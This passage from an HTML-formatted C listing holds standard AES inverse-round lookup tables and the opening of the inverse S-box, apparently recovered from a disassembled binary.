class="number">0x50cd7f0e</span>, <span class="number">0xf691172f</span>, <span class="number">0xd64d768d</span>, <span class="number">0xb0ef434d</span>, <span class="number">0x4daacc54</span>, <span class="number">0x496e4df</span>, <span class="number">0xb5d19ee3</span>, <span class="number">0x886a4c1b</span>, <span class="number">0x1f2cc1b8</span>, <span class="number">0x5165467f</span>, <span class="number">0xea5e9d04</span>, <span class="number">0x358c015d</span>, <span class="number">0x7487fa73</span>, <span class="number">0x410bfb2e</span>, <span class="number">0x1d67b35a</span>, <span class="number">0xd2db9252</span>, <span class="number">0x5610e933</span>, <span class="number">0x47d66d13</span>, <span class="number">0x61d79a8c</span>, <span class="number">0xca1377a</span>, <span class="number">0x14f8598e</span>, <span class="number">0x3c13eb89</span>, <span class="number">0x27a9ceee</span>, <span class="number">0xc961b735</span>, <span class="number">0xe51ce1ed</span>, <span class="number">0xb1477a3c</span>, <span class="number">0xdfd29c59</span>, <span class="number">0x73f2553f</span>, <span class="number">0xce141879</span>, <span class="number">0x37c773bf</span>, <span class="number">0xcdf753ea</span>, <span class="number">0xaafd5f5b</span>, <span class="number">0x6f3ddf14</span>, <span class="number">0xdb447886</span>, <span class="number">0xf3afca81</span>, <span class="number">0xc468b93e</span>, <span class="number">0x3424382c</span>, <span class="number">0x40a3c25f</span>, <span class="number">0xc31d1672</span>, <span class="number">0x25e2bc0c</span>, <span class="number">0x493c288b</span>, <span class="number">0x950dff41</span>, <span class="number">0x1a83971</span>, <span class="number">0xb30c08de</span>, <span class="number">0xe4b4d89c</span>, <span class="number">0xc1566490</span>, <span class="number">0x84cb7b61</span>, <span class="number">0xb632d570</span>, <span class="number">0x5c6c4874</span>, <span class="number">0x57b8d042</span> &#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405820[<span class="number">256</span>] = &#123; <span class="number">0xf45150a7</span>, <span class="number">0x417e5365</span>, <span class="number">0x171ac3a4</span>, <span class="number">0x273a965e</span>, <span class="number">0xab3bcb6b</span>, <span class="number">0x9d1ff145</span>, <span class="number">0xfaacab58</span>, <span class="number">0xe34b9303</span>, <span class="number">0x302055fa</span>, <span class="number">0x76adf66d</span>, <span class="number">0xcc889176</span>, <span class="number">0x2f5254c</span>, <span class="number">0xe54ffcd7</span>, <span class="number">0x2ac5d7cb</span>, <span class="number">0x35268044</span>, <span class="number">0x62b58fa3</span>, <span class="number">0xb1de495a</span>, <span class="number">0xba25671b</span>, <span class="number">0xea45980e</span>, <span class="number">0xfe5de1c0</span>, <span class="number">0x2fc30275</span>, <span class="number">0x4c8112f0</span>, <span class="number">0x468da397</span>, <span class="number">0xd36bc6f9</span>, <span class="number">0x8f03e75f</span>, <span class="number">0x9215959c</span>, <span class="number">0x6dbfeb7a</span>, <span class="number">0x5295da59</span>, <span class="number">0xbed42d83</span>, <span class="number">0x7458d321</span>, <span class="number">0xe0492969</span>, <span class="number">0xc98e44c8</span>, <span class="number">0xc2756a89</span>, <span class="number">0x8ef47879</span>, <span class="number">0x58996b3e</span>, <span class="number">0xb927dd71</span>, <span class="number">0xe1beb64f</span>, <span class="number">0x88f017ad</span>, <span class="number">0x20c966ac</span>, <span class="number">0xce7db43a</span>, <span class="number">0xdf63184a</span>, <span class="number">0x1ae58231</span>, <span class="number">0x51976033</span>, <span class="number">0x5362457f</span>, <span class="number">0x64b1e077</span>, <span class="number">0x6bbb84ae</span>, <span class="number">0x81fe1ca0</span>, <span class="number">0x8f9942b</span>, <span class="number">0x48705868</span>, <span class="number">0x458f19fd</span>, <span class="number">0xde94876c</span>, <span class="number">0x7b52b7f8</span>, <span class="number">0x73ab23d3</span>, <span class="number">0x4b72e202</span>, <span class="number">0x1fe3578f</span>, <span class="number">0x55662aab</span>, <span class="number">0xebb20728</span>, <span class="number">0xb52f03c2</span>, <span class="number">0xc5869a7b</span>, <span class="number">0x37d3a508</span>, <span class="number">0x2830f287</span>, <span class="number">0xbf23b2a5</span>, <span class="number">0x302ba6a</span>, <span class="number">0x16ed5c82</span>, <span class="number">0xcf8a2b1c</span>, <span class="number">0x79a792b4</span>, <span class="number">0x7f3f0f2</span>, <span class="number">0x694ea1e2</span>, <span class="number">0xda65cdf4</span>, <span class="number">0x506d5be</span>, <span class="number">0x34d11f62</span>, <span class="number">0xa6c48afe</span>, <span class="number">0x2e349d53</span>, <span class="number">0xf3a2a055</span>, <span class="number">0x8a0532e1</span>, <span class="number">0xf6a475eb</span>, <span class="number">0x830b39ec</span>, <span class="number">0x6040aaef</span>, <span class="number">0x715e069f</span>, <span class="number">0x6ebd5110</span>, <span class="number">0x213ef98a</span>, <span class="number">0xdd963d06</span>, <span class="number">0x3eddae05</span>, <span class="number">0xe64d46bd</span>, <span class="number">0x5491b58d</span>, <span class="number">0xc471055d</span>, <span class="number">0x6046fd4</span>, <span class="number">0x5060ff15</span>, <span class="number">0x981924fb</span>, <span class="number">0xbdd697e9</span>, <span class="number">0x4089cc43</span>, <span class="number">0xd967779e</span>, <span class="number">0xe8b0bd42</span>, <span class="number">0x8907888b</span>, <span class="number">0x19e7385b</span>, <span class="number">0xc879dbee</span>, <span class="number">0x7ca1470a</span>, <span class="number">0x427ce90f</span>, <span class="number">0x84f8c91e</span>, <span class="number">0x0</span>, <span class="number">0x80098386</span>, <span class="number">0x2b3248ed</span>, <span class="number">0x111eac70</span>, <span class="number">0x5a6c4e72</span>, <span class="number">0xefdfbff</span>, <span class="number">0x850f5638</span>, <span class="number">0xae3d1ed5</span>, <span class="number">0x2d362739</span>, <span class="number">0xf0a64d9</span>, <span class="number">0x5c6821a6</span>, <span class="number">0x5b9bd154</span>, <span class="number">0x36243a2e</span>, <span class="number">0xa0cb167</span>, <span class="number">0x57930fe7</span>, <span class="number">0xeeb4d296</span>, <span class="number">0x9b1b9e91</span>, <span class="number">0xc0804fc5</span>, <span class="number">0xdc61a220</span>, <span class="number">0x775a694b</span>, <span class="number">0x121c161a</span>, <span class="number">0x93e20aba</span>, <span class="number">0xa0c0e52a</span>, <span class="number">0x223c43e0</span>, <span class="number">0x1b121d17</span>, <span class="number">0x90e0b0d</span>, <span class="number">0x8bf2adc7</span>, <span class="number">0xb62db9a8</span>, <span class="number">0x1e14c8a9</span>, <span class="number">0xf1578519</span>, <span class="number">0x75af4c07</span>, <span class="number">0x99eebbdd</span>, <span class="number">0x7fa3fd60</span>, <span class="number">0x1f79f26</span>, <span class="number">0x725cbcf5</span>, <span class="number">0x6644c53b</span>, <span class="number">0xfb5b347e</span>, <span class="number">0x438b7629</span>, <span class="number">0x23cbdcc6</span>, <span class="number">0xedb668fc</span>, <span class="number">0xe4b863f1</span>, <span class="number">0x31d7cadc</span>, <span class="number">0x63421085</span>, <span class="number">0x97134022</span>, <span class="number">0xc6842011</span>, <span class="number">0x4a857d24</span>, <span class="number">0xbbd2f83d</span>, <span class="number">0xf9ae1132</span>, <span class="number">0x29c76da1</span>, <span class="number">0x9e1d4b2f</span>, <span class="number">0xb2dcf330</span>, <span class="number">0x860dec52</span>, <span class="number">0xc177d0e3</span>, <span class="number">0xb32b6c16</span>, <span class="number">0x70a999b9</span>, <span class="number">0x9411fa48</span>, <span class="number">0xe9472264</span>, <span class="number">0xfca8c48c</span>, <span class="number">0xf0a01a3f</span>, <span class="number">0x7d56d82c</span>, <span class="number">0x3322ef90</span>, <span class="number">0x4987c74e</span>, <span class="number">0x38d9c1d1</span>, <span class="number">0xca8cfea2</span>, <span class="number">0xd498360b</span>, <span class="number">0xf5a6cf81</span>, <span class="number">0x7aa528de</span>, <span class="number">0xb7da268e</span>, <span class="number">0xad3fa4bf</span>, <span class="number">0x3a2ce49d</span>, <span class="number">0x78500d92</span>, <span class="number">0x5f6a9bcc</span>, <span class="number">0x7e546246</span>, <span class="number">0x8df6c213</span>, <span class="number">0xd890e8b8</span>, <span class="number">0x392e5ef7</span>, <span class="number">0xc382f5af</span>, <span class="number">0x5d9fbe80</span>, <span class="number">0xd0697c93</span>, <span class="number">0xd56fa92d</span>, <span class="number">0x25cfb312</span>, <span class="number">0xacc83b99</span>, <span class="number">0x1810a77d</span>, <span class="number">0x9ce86e63</span>, <span class="number">0x3bdb7bbb</span>, <span class="number">0x26cd0978</span>, <span class="number">0x596ef418</span>, <span class="number">0x9aec01b7</span>, <span class="number">0x4f83a89a</span>, <span class="number">0x95e6656e</span>, <span class="number">0xffaa7ee6</span>, <span class="number">0xbc2108cf</span>, <span class="number">0x15efe6e8</span>, <span class="number">0xe7bad99b</span>, <span class="number">0x6f4ace36</span>, <span class="number">0x9fead409</span>, <span class="number">0xb029d67c</span>, <span class="number">0xa431afb2</span>, <span class="number">0x3f2a3123</span>, <span class="number">0xa5c63094</span>, <span class="number">0xa235c066</span>, <span class="number">0x4e7437bc</span>, <span class="number">0x82fca6ca</span>, <span class="number">0x90e0b0d0</span>, <span class="number">0xa73315d8</span>, <span class="number">0x4f14a98</span>, <span class="number">0xec41f7da</span>, <span class="number">0xcd7f0e50</span>, <span class="number">0x91172ff6</span>, <span class="number">0x4d768dd6</span>, <span class="number">0xef434db0</span>, <span class="number">0xaacc544d</span>, <span class="number">0x96e4df04</span>, <span class="number">0xd19ee3b5</span>, <span class="number">0x6a4c1b88</span>, <span class="number">0x2cc1b81f</span>, <span class="number">0x65467f51</span>, <span class="number">0x5e9d04ea</span>, <span class="number">0x8c015d35</span>, <span class="number">0x87fa7374</span>, <span class="number">0xbfb2e41</span>, <span class="number">0x67b35a1d</span>, <span class="number">0xdb9252d2</span>, <span class="number">0x10e93356</span>, <span class="number">0xd66d1347</span>, <span class="number">0xd79a8c61</span>, <span class="number">0xa1377a0c</span>, <span class="number">0xf8598e14</span>, <span class="number">0x13eb893c</span>, <span class="number">0xa9ceee27</span>, <span class="number">0x61b735c9</span>, <span class="number">0x1ce1ede5</span>, <span class="number">0x477a3cb1</span>, <span class="number">0xd29c59df</span>, <span class="number">0xf2553f73</span>, <span class="number">0x141879ce</span>, <span class="number">0xc773bf37</span>, <span class="number">0xf753eacd</span>, <span class="number">0xfd5f5baa</span>, <span class="number">0x3ddf146f</span>, <span class="number">0x447886db</span>, <span class="number">0xafca81f3</span>, <span class="number">0x68b93ec4</span>, <span class="number">0x24382c34</span>, <span class="number">0xa3c25f40</span>, <span class="number">0x1d1672c3</span>, <span class="number">0xe2bc0c25</span>, <span class="number">0x3c288b49</span>, <span class="number">0xdff4195</span>, <span class="number">0xa8397101</span>, <span class="number">0xc08deb3</span>, <span class="number">0xb4d89ce4</span>, <span class="number">0x566490c1</span>, <span class="number">0xcb7b6184</span>, <span class="number">0x32d570b6</span>, <span class="number">0x6c48745c</span>, <span class="number">0xb8d04257</span> &#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405C20[<span class="number">256</span>] = &#123; <span class="number">0x5150a7f4</span>, <span class="number">0x7e536541</span>, <span class="number">0x1ac3a417</span>, <span class="number">0x3a965e27</span>, <span class="number">0x3bcb6bab</span>, <span class="number">0x1ff1459d</span>, <span class="number">0xacab58fa</span>, <span class="number">0x4b9303e3</span>, <span class="number">0x2055fa30</span>, <span class="number">0xadf66d76</span>, <span class="number">0x889176cc</span>, <span class="number">0xf5254c02</span>, <span class="number">0x4ffcd7e5</span>, <span class="number">0xc5d7cb2a</span>, <span class="number">0x26804435</span>, <span class="number">0xb58fa362</span>, <span class="number">0xde495ab1</span>, <span class="number">0x25671bba</span>, <span class="number">0x45980eea</span>, <span class="number">0x5de1c0fe</span>, <span class="number">0xc302752f</span>, <span class="number">0x8112f04c</span>, <span class="number">0x8da39746</span>, <span class="number">0x6bc6f9d3</span>, <span class="number">0x3e75f8f</span>, <span class="number">0x15959c92</span>, <span class="number">0xbfeb7a6d</span>, <span class="number">0x95da5952</span>, <span class="number">0xd42d83be</span>, <span class="number">0x58d32174</span>, <span class="number">0x492969e0</span>, <span class="number">0x8e44c8c9</span>, <span class="number">0x756a89c2</span>, <span class="number">0xf478798e</span>, <span class="number">0x996b3e58</span>, <span class="number">0x27dd71b9</span>, <span class="number">0xbeb64fe1</span>, <span class="number">0xf017ad88</span>, <span class="number">0xc966ac20</span>, <span class="number">0x7db43ace</span>, <span class="number">0x63184adf</span>, <span class="number">0xe582311a</span>, <span class="number">0x97603351</span>, <span class="number">0x62457f53</span>, <span class="number">0xb1e07764</span>, <span class="number">0xbb84ae6b</span>, <span class="number">0xfe1ca081</span>, <span class="number">0xf9942b08</span>, <span class="number">0x70586848</span>, <span class="number">0x8f19fd45</span>, <span class="number">0x94876cde</span>, <span class="number">0x52b7f87b</span>, <span class="number">0xab23d373</span>, <span class="number">0x72e2024b</span>, <span class="number">0xe3578f1f</span>, <span class="number">0x662aab55</span>, <span class="number">0xb20728eb</span>, <span class="number">0x2f03c2b5</span>, <span class="number">0x869a7bc5</span>, <span class="number">0xd3a50837</span>, <span class="number">0x30f28728</span>, <span class="number">0x23b2a5bf</span>, <span class="number">0x2ba6a03</span>, <span class="number">0xed5c8216</span>, <span class="number">0x8a2b1ccf</span>, <span class="number">0xa792b479</span>, <span class="number">0xf3f0f207</span>, <span class="number">0x4ea1e269</span>, <span class="number">0x65cdf4da</span>, <span class="number">0x6d5be05</span>, <span class="number">0xd11f6234</span>, <span class="number">0xc48afea6</span>, <span class="number">0x349d532e</span>, <span class="number">0xa2a055f3</span>, <span class="number">0x532e18a</span>, <span class="number">0xa475ebf6</span>, <span class="number">0xb39ec83</span>, <span class="number">0x40aaef60</span>, <span class="number">0x5e069f71</span>, <span class="number">0xbd51106e</span>, <span class="number">0x3ef98a21</span>, <span class="number">0x963d06dd</span>, <span class="number">0xddae053e</span>, <span class="number">0x4d46bde6</span>, <span class="number">0x91b58d54</span>, <span class="number">0x71055dc4</span>, <span class="number">0x46fd406</span>, <span class="number">0x60ff1550</span>, <span class="number">0x1924fb98</span>, <span class="number">0xd697e9bd</span>, <span class="number">0x89cc4340</span>, <span class="number">0x67779ed9</span>, <span class="number">0xb0bd42e8</span>, <span class="number">0x7888b89</span>, <span class="number">0xe7385b19</span>, <span class="number">0x79dbeec8</span>, <span class="number">0xa1470a7c</span>, <span class="number">0x7ce90f42</span>, <span class="number">0xf8c91e84</span>, <span class="number">0x0</span>, <span class="number">0x9838680</span>, <span class="number">0x3248ed2b</span>, <span class="number">0x1eac7011</span>, <span class="number">0x6c4e725a</span>, <span class="number">0xfdfbff0e</span>, <span class="number">0xf563885</span>, <span class="number">0x3d1ed5ae</span>, <span class="number">0x3627392d</span>, <span class="number">0xa64d90f</span>, <span class="number">0x6821a65c</span>, <span class="number">0x9bd1545b</span>, <span class="number">0x243a2e36</span>, <span class="number">0xcb1670a</span>, <span class="number">0x930fe757</span>, <span class="number">0xb4d296ee</span>, <span class="number">0x1b9e919b</span>, <span class="number">0x804fc5c0</span>, <span class="number">0x61a220dc</span>, <span class="number">0x5a694b77</span>, <span class="number">0x1c161a12</span>, <span class="number">0xe20aba93</span>, <span class="number">0xc0e52aa0</span>, <span class="number">0x3c43e022</span>, <span class="number">0x121d171b</span>, <span class="number">0xe0b0d09</span>, <span class="number">0xf2adc78b</span>, <span class="number">0x2db9a8b6</span>, <span class="number">0x14c8a91e</span>, <span class="number">0x578519f1</span>, <span class="number">0xaf4c0775</span>, <span class="number">0xeebbdd99</span>, <span class="number">0xa3fd607f</span>, <span class="number">0xf79f2601</span>, <span class="number">0x5cbcf572</span>, <span class="number">0x44c53b66</span>, <span class="number">0x5b347efb</span>, <span class="number">0x8b762943</span>, <span class="number">0xcbdcc623</span>, <span class="number">0xb668fced</span>, <span class="number">0xb863f1e4</span>, <span class="number">0xd7cadc31</span>, <span class="number">0x42108563</span>, <span class="number">0x13402297</span>, <span class="number">0x842011c6</span>, <span class="number">0x857d244a</span>, <span class="number">0xd2f83dbb</span>, <span class="number">0xae1132f9</span>, <span class="number">0xc76da129</span>, <span class="number">0x1d4b2f9e</span>, <span class="number">0xdcf330b2</span>, <span class="number">0xdec5286</span>, <span class="number">0x77d0e3c1</span>, <span class="number">0x2b6c16b3</span>, <span class="number">0xa999b970</span>, <span class="number">0x11fa4894</span>, <span class="number">0x472264e9</span>, <span class="number">0xa8c48cfc</span>, <span class="number">0xa01a3ff0</span>, <span class="number">0x56d82c7d</span>, <span class="number">0x22ef9033</span>, <span class="number">0x87c74e49</span>, <span class="number">0xd9c1d138</span>, <span class="number">0x8cfea2ca</span>, <span class="number">0x98360bd4</span>, <span class="number">0xa6cf81f5</span>, <span class="number">0xa528de7a</span>, <span class="number">0xda268eb7</span>, <span class="number">0x3fa4bfad</span>, <span class="number">0x2ce49d3a</span>, <span class="number">0x500d9278</span>, <span class="number">0x6a9bcc5f</span>, <span class="number">0x5462467e</span>, <span class="number">0xf6c2138d</span>, <span class="number">0x90e8b8d8</span>, <span class="number">0x2e5ef739</span>, <span class="number">0x82f5afc3</span>, <span class="number">0x9fbe805d</span>, <span class="number">0x697c93d0</span>, <span class="number">0x6fa92dd5</span>, <span class="number">0xcfb31225</span>, <span class="number">0xc83b99ac</span>, <span class="number">0x10a77d18</span>, <span class="number">0xe86e639c</span>, <span class="number">0xdb7bbb3b</span>, <span class="number">0xcd097826</span>, <span class="number">0x6ef41859</span>, <span class="number">0xec01b79a</span>, <span class="number">0x83a89a4f</span>, <span class="number">0xe6656e95</span>, <span class="number">0xaa7ee6ff</span>, <span class="number">0x2108cfbc</span>, <span class="number">0xefe6e815</span>, <span class="number">0xbad99be7</span>, <span class="number">0x4ace366f</span>, <span class="number">0xead4099f</span>, <span class="number">0x29d67cb0</span>, <span class="number">0x31afb2a4</span>, <span class="number">0x2a31233f</span>, <span class="number">0xc63094a5</span>, <span class="number">0x35c066a2</span>, <span class="number">0x7437bc4e</span>, <span class="number">0xfca6ca82</span>, <span class="number">0xe0b0d090</span>, <span class="number">0x3315d8a7</span>, <span class="number">0xf14a9804</span>, <span class="number">0x41f7daec</span>, <span class="number">0x7f0e50cd</span>, <span class="number">0x172ff691</span>, <span class="number">0x768dd64d</span>, <span class="number">0x434db0ef</span>, <span class="number">0xcc544daa</span>, <span class="number">0xe4df0496</span>, <span class="number">0x9ee3b5d1</span>, <span class="number">0x4c1b886a</span>, <span class="number">0xc1b81f2c</span>, <span class="number">0x467f5165</span>, <span class="number">0x9d04ea5e</span>, <span class="number">0x15d358c</span>, <span class="number">0xfa737487</span>, <span class="number">0xfb2e410b</span>, <span class="number">0xb35a1d67</span>, <span class="number">0x9252d2db</span>, <span class="number">0xe9335610</span>, <span class="number">0x6d1347d6</span>, <span class="number">0x9a8c61d7</span>, <span class="number">0x377a0ca1</span>, <span class="number">0x598e14f8</span>, <span class="number">0xeb893c13</span>, <span class="number">0xceee27a9</span>, <span class="number">0xb735c961</span>, <span class="number">0xe1ede51c</span>, <span class="number">0x7a3cb147</span>, <span class="number">0x9c59dfd2</span>, <span class="number">0x553f73f2</span>, <span class="number">0x1879ce14</span>, <span class="number">0x73bf37c7</span>, <span class="number">0x53eacdf7</span>, <span class="number">0x5f5baafd</span>, <span class="number">0xdf146f3d</span>, <span class="number">0x7886db44</span>, <span class="number">0xca81f3af</span>, <span class="number">0xb93ec468</span>, <span class="number">0x382c3424</span>, <span class="number">0xc25f40a3</span>, <span class="number">0x1672c31d</span>, <span class="number">0xbc0c25e2</span>, <span class="number">0x288b493c</span>, <span class="number">0xff41950d</span>, <span class="number">0x397101a8</span>, <span class="number">0x8deb30c</span>, <span class="number">0xd89ce4b4</span>, <span class="number">0x6490c156</span>, <span class="number">0x7b6184cb</span>, <span class="number">0xd570b632</span>, <span class="number">0x48745c6c</span>, <span class="number">0xd04257b8</span> &#125;;</span><br><span class="line"></span><br><span class="line">DWORD dword_405020[<span class="number">256</span>] = &#123; <span class="number">0x50a7f451</span>, <span class="number">0x5365417e</span>, <span class="number">0xc3a4171a</span>, <span class="number">0x965e273a</span>, <span class="number">0xcb6bab3b</span>, <span class="number">0xf1459d1f</span>, <span class="number">0xab58faac</span>, <span class="number">0x9303e34b</span>, <span class="number">0x55fa3020</span>, <span class="number">0xf66d76ad</span>, <span class="number">0x9176cc88</span>, <span class="number">0x254c02f5</span>, <span class="number">0xfcd7e54f</span>, <span class="number">0xd7cb2ac5</span>, <span class="number">0x80443526</span>, <span class="number">0x8fa362b5</span>, <span class="number">0x495ab1de</span>, <span class="number">0x671bba25</span>, <span class="number">0x980eea45</span>, <span class="number">0xe1c0fe5d</span>, <span class="number">0x2752fc3</span>, <span class="number">0x12f04c81</span>, <span class="number">0xa397468d</span>, <span class="number">0xc6f9d36b</span>, <span class="number">0xe75f8f03</span>, <span class="number">0x959c9215</span>, <span class="number">0xeb7a6dbf</span>, <span class="number">0xda595295</span>, <span class="number">0x2d83bed4</span>, <span class="number">0xd3217458</span>, <span class="number">0x2969e049</span>, <span class="number">0x44c8c98e</span>, <span class="number">0x6a89c275</span>, <span class="number">0x78798ef4</span>, <span class="number">0x6b3e5899</span>, <span class="number">0xdd71b927</span>, <span class="number">0xb64fe1be</span>, <span class="number">0x17ad88f0</span>, <span class="number">0x66ac20c9</span>, <span class="number">0xb43ace7d</span>, <span class="number">0x184adf63</span>, <span class="number">0x82311ae5</span>, <span class="number">0x60335197</span>, <span class="number">0x457f5362</span>, <span class="number">0xe07764b1</span>, <span class="number">0x84ae6bbb</span>, <span class="number">0x1ca081fe</span>, <span class="number">0x942b08f9</span>, <span class="number">0x58684870</span>, <span class="number">0x19fd458f</span>, <span class="number">0x876cde94</span>, <span class="number">0xb7f87b52</span>, <span class="number">0x23d373ab</span>, <span class="number">0xe2024b72</span>, <span class="number">0x578f1fe3</span>, <span class="number">0x2aab5566</span>, <span class="number">0x728ebb2</span>, <span class="number">0x3c2b52f</span>, <span class="number">0x9a7bc586</span>, <span class="number">0xa50837d3</span>, <span class="number">0xf2872830</span>, <span class="number">0xb2a5bf23</span>, <span class="number">0xba6a0302</span>, <span class="number">0x5c8216ed</span>, <span class="number">0x2b1ccf8a</span>, <span class="number">0x92b479a7</span>, <span class="number">0xf0f207f3</span>, <span class="number">0xa1e2694e</span>, <span class="number">0xcdf4da65</span>, <span class="number">0xd5be0506</span>, <span class="number">0x1f6234d1</span>, <span class="number">0x8afea6c4</span>, <span class="number">0x9d532e34</span>, <span class="number">0xa055f3a2</span>, <span class="number">0x32e18a05</span>, <span class="number">0x75ebf6a4</span>, <span class="number">0x39ec830b</span>, <span class="number">0xaaef6040</span>, <span class="number">0x69f715e</span>, <span class="number">0x51106ebd</span>, <span class="number">0xf98a213e</span>, <span class="number">0x3d06dd96</span>, <span class="number">0xae053edd</span>, <span class="number">0x46bde64d</span>, <span class="number">0xb58d5491</span>, <span class="number">0x55dc471</span>, <span class="number">0x6fd40604</span>, <span class="number">0xff155060</span>, <span class="number">0x24fb9819</span>, <span class="number">0x97e9bdd6</span>, <span class="number">0xcc434089</span>, <span class="number">0x779ed967</span>, <span class="number">0xbd42e8b0</span>, <span class="number">0x888b8907</span>, <span class="number">0x385b19e7</span>, <span class="number">0xdbeec879</span>, <span class="number">0x470a7ca1</span>, <span class="number">0xe90f427c</span>, <span class="number">0xc91e84f8</span>, <span class="number">0x0</span>, <span class="number">0x83868009</span>, <span class="number">0x48ed2b32</span>, <span class="number">0xac70111e</span>, <span class="number">0x4e725a6c</span>, <span class="number">0xfbff0efd</span>, <span class="number">0x5638850f</span>, <span class="number">0x1ed5ae3d</span>, <span class="number">0x27392d36</span>, <span class="number">0x64d90f0a</span>, <span class="number">0x21a65c68</span>, <span class="number">0xd1545b9b</span>, <span class="number">0x3a2e3624</span>, <span class="number">0xb1670a0c</span>, <span class="number">0xfe75793</span>, <span class="number">0xd296eeb4</span>, <span class="number">0x9e919b1b</span>, <span class="number">0x4fc5c080</span>, <span class="number">0xa220dc61</span>, <span class="number">0x694b775a</span>, <span class="number">0x161a121c</span>, <span class="number">0xaba93e2</span>, <span class="number">0xe52aa0c0</span>, <span class="number">0x43e0223c</span>, <span class="number">0x1d171b12</span>, <span class="number">0xb0d090e</span>, <span class="number">0xadc78bf2</span>, <span class="number">0xb9a8b62d</span>, <span class="number">0xc8a91e14</span>, <span class="number">0x8519f157</span>, <span class="number">0x4c0775af</span>, <span class="number">0xbbdd99ee</span>, <span class="number">0xfd607fa3</span>, <span class="number">0x9f2601f7</span>, <span class="number">0xbcf5725c</span>, <span class="number">0xc53b6644</span>, <span class="number">0x347efb5b</span>, <span class="number">0x7629438b</span>, <span class="number">0xdcc623cb</span>, <span class="number">0x68fcedb6</span>, <span class="number">0x63f1e4b8</span>, <span class="number">0xcadc31d7</span>, <span class="number">0x10856342</span>, <span class="number">0x40229713</span>, <span class="number">0x2011c684</span>, <span class="number">0x7d244a85</span>, <span class="number">0xf83dbbd2</span>, <span class="number">0x1132f9ae</span>, <span class="number">0x6da129c7</span>, <span class="number">0x4b2f9e1d</span>, <span class="number">0xf330b2dc</span>, <span class="number">0xec52860d</span>, <span class="number">0xd0e3c177</span>, <span class="number">0x6c16b32b</span>, <span class="number">0x99b970a9</span>, <span class="number">0xfa489411</span>, <span class="number">0x2264e947</span>, <span class="number">0xc48cfca8</span>, <span class="number">0x1a3ff0a0</span>, <span class="number">0xd82c7d56</span>, <span class="number">0xef903322</span>, <span class="number">0xc74e4987</span>, <span class="number">0xc1d138d9</span>, <span class="number">0xfea2ca8c</span>, <span class="number">0x360bd498</span>, <span class="number">0xcf81f5a6</span>, <span class="number">0x28de7aa5</span>, <span class="number">0x268eb7da</span>, <span class="number">0xa4bfad3f</span>, <span class="number">0xe49d3a2c</span>, <span class="number">0xd927850</span>, <span class="number">0x9bcc5f6a</span>, <span class="number">0x62467e54</span>, <span class="number">0xc2138df6</span>, <span class="number">0xe8b8d890</span>, <span class="number">0x5ef7392e</span>, <span class="number">0xf5afc382</span>, <span class="number">0xbe805d9f</span>, <span class="number">0x7c93d069</span>, <span class="number">0xa92dd56f</span>, <span class="number">0xb31225cf</span>, <span class="number">0x3b99acc8</span>, <span class="number">0xa77d1810</span>, <span class="number">0x6e639ce8</span>, <span class="number">0x7bbb3bdb</span>, <span class="number">0x97826cd</span>, <span class="number">0xf418596e</span>, <span class="number">0x1b79aec</span>, <span class="number">0xa89a4f83</span>, <span class="number">0x656e95e6</span>, <span class="number">0x7ee6ffaa</span>, <span class="number">0x8cfbc21</span>, <span class="number">0xe6e815ef</span>, <span class="number">0xd99be7ba</span>, <span class="number">0xce366f4a</span>, <span class="number">0xd4099fea</span>, <span class="number">0xd67cb029</span>, <span class="number">0xafb2a431</span>, <span class="number">0x31233f2a</span>, <span class="number">0x3094a5c6</span>, <span class="number">0xc066a235</span>, <span class="number">0x37bc4e74</span>, <span class="number">0xa6ca82fc</span>, <span class="number">0xb0d090e0</span>, <span class="number">0x15d8a733</span>, <span class="number">0x4a9804f1</span>, <span class="number">0xf7daec41</span>, <span class="number">0xe50cd7f</span>, <span class="number">0x2ff69117</span>, <span class="number">0x8dd64d76</span>, <span class="number">0x4db0ef43</span>, <span class="number">0x544daacc</span>, <span class="number">0xdf0496e4</span>, <span class="number">0xe3b5d19e</span>, <span class="number">0x1b886a4c</span>, <span class="number">0xb81f2cc1</span>, <span class="number">0x7f516546</span>, <span class="number">0x4ea5e9d</span>, <span class="number">0x5d358c01</span>, <span class="number">0x737487fa</span>, <span class="number">0x2e410bfb</span>, <span class="number">0x5a1d67b3</span>, <span class="number">0x52d2db92</span>, <span class="number">0x335610e9</span>, <span class="number">0x1347d66d</span>, <span class="number">0x8c61d79a</span>, <span class="number">0x7a0ca137</span>, <span class="number">0x8e14f859</span>, <span class="number">0x893c13eb</span>, <span class="number">0xee27a9ce</span>, <span class="number">0x35c961b7</span>, <span class="number">0xede51ce1</span>, <span class="number">0x3cb1477a</span>, <span class="number">0x59dfd29c</span>, <span class="number">0x3f73f255</span>, <span class="number">0x79ce1418</span>, <span class="number">0xbf37c773</span>, <span class="number">0xeacdf753</span>, <span class="number">0x5baafd5f</span>, <span class="number">0x146f3ddf</span>, <span class="number">0x86db4478</span>, <span class="number">0x81f3afca</span>, <span class="number">0x3ec468b9</span>, <span class="number">0x2c342438</span>, <span class="number">0x5f40a3c2</span>, <span class="number">0x72c31d16</span>, <span class="number">0xc25e2bc</span>, <span class="number">0x8b493c28</span>, <span class="number">0x41950dff</span>, <span class="number">0x7101a839</span>, <span class="number">0xdeb30c08</span>, <span class="number">0x9ce4b4d8</span>, <span class="number">0x90c15664</span>, <span class="number">0x6184cb7b</span>, <span class="number">0x70b632d5</span>, <span class="number">0x745c6c48</span>, <span class="number">0x4257b8d0</span> &#125;;</span><br><span class="line"></span><br><span class="line">BYTE RijnDael_AES_LONG_inv_406120[<span class="number">256</span>] = &#123; <span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>, <span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>,</span><br><span class="line">  <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>,</span><br><span class="line">  <span class="number">0xE9</span>, <span class="number">0xCB</span>, <span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>,</span><br><span class="line">  